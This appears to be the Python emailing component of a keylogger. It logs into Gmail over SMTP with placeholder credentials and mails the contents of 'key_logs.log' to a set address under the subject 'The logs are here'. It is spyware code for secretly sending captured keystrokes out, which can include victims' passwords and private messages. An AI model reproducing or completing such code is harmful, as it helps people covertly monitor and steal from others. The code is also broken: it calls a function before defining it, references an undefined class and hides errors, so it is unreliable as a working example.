import sys
import smtplib

from string import Template

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


# Set up the SMTP server
try:
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login('EMAIL', 'PASS')

    MESSAGE_TEMPLATE = read_template('key_logs.log')
except:
    print('Error para levantar el servidor smtp')

def read_template(filename):
    """
    Returns a Template object comprising the contents of the 
    file specified by filename.
    """
    
    with open(filename, 'r', encoding='utf-8') as template_file:
        template_file_content = template_file.read()
    return Template(template_file_content)


class SendEmail():
     
    def __init__(self, name, email):
        self.name = name
        self.email = email

        if self.validate_data():
            print(Common.ERROR_EMAIL_MESSAGE)
            sys.exit()
        self.send_email()

    def validate_data(self):
        return self.name is None and self.email is None

    def send_email(self):
        msg = MIMEMultipart()
        
        # Headers of the message
        msg['From'] = 'HERE_MY_ADDRESS'
        msg['To'] = self.email
        msg['Subject'] = f"The logs are here {self.name}"
                
        msg.attach(MIMEText(MESSAGE_TEMPLATE, 'plain'))
        
        s.send_message(msg)
        s.quit()

    @staticmethod
    def validate_list(list_data):
        return len(list_data) == 4